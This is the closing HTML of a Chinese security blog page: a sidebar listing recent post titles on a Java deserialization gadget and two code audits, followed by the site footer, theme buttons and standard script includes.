href="/2024/11/15/Rome-deserialise/" title="Rome_deserialise">Rome_deserialise</a><time datetime="2024-11-15T12:18:59.000Z" title="发表于 2024-11-15 20:18:59">2024-11-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/15/starsea-mall%E5%AE%A1%E8%AE%A1/" title="starsea-mall审计">starsea-mall审计</a><time datetime="2024-11-15T11:17:24.000Z" title="发表于 2024-11-15 19:17:24">2024-11-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/20/ofcms%E5%AE%A1%E8%AE%A1/" title="ofcms审计">ofcms审计</a><time datetime="2024-10-20T14:26:40.000Z" title="发表于 2024-10-20 22:26:40">2024-10-20</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://n11-blogs.oss-cn-chengdu.aliyuncs.com/img/202410211032773.png);"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By N11</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>